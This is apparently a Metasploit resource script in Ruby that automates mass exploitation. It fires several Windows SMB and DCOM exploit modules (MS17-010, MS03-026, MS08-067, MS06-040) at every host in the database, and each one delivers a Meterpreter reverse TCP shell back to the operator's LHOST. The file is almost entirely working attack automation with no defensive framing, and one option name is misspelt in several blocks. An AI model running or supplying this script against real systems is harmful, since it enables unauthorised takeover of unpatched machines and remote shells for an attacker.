<ruby>
   help = %Q|
      Description:
      This Metasploit RC file can be used to automate the exploitation process.
      In this example we use db_nmap to populate msfdb database with hosts.

   |
   print_line(help)
   Rex::sleep(0.5)
   if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
      print_line("[!] Please set RHOSTS")
      return nil
   end
   if (framework.datastore['LHOST'] == nil or framework.datastore['LHOST'] == '')
      print_line("[!] Please set an LHOST")
      return nil
   end
   xhost = framework.db.hosts.map(&:address).join(' ')
   run_single("setg RHOSTS #{xhost}")
   run_single("use exploit/windows/smb/ms17_010_psexec")
   run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8989")
   run_single("set DisablePayloadHandler True")
   run_single("exploit -j -z")
   Rex::sleep(5.0)
   xhost = framework.db.hosts.map(&:address).join(' ')
   run_single("setg RHOSTS #{xhost}")
   run_single("use exploit/windows/dcerpc/ms03_026_dcom")
   run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8989")
   run_single("set DisablePayloadHander True")
   run_single("exploit -j -z")
   Rex::sleep(5.0)
   xhost = framework.db.hosts.map(&:address).join(' ')
   run_single("setg RHOSTS #{xhost}")
   run_single("use exploit/windows/smb/ms08_067_netapi")
   run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8989")
   run_single("set DisablePayloadHander True")
   run_single("exploit -j -z")
   Rex::sleep(5.0)
   xhost = framework.db.hosts.map(&:address).join(' ')
   run_single("setg RHOSTS #{xhost}")
   run_single("use exploit/windows/smb/ms06_040_netapi")
   run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8989")
   run_single("set DisablePayloadHander True")
   run_single("exploit -j -z")
   Rex::sleep(5.0)
   xhost = framework.db.hosts.map(&:address).join(' ')
   run_single("setg RHOSTS #{xhost}")
   run_single("use exploit/windows/smb/ms06_040_netapi")
   run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8989")
   run_single("set DisablePayloadHander True")
   run_single("exploit -j -z")
   Rex::sleep(5.0)


</ruby>
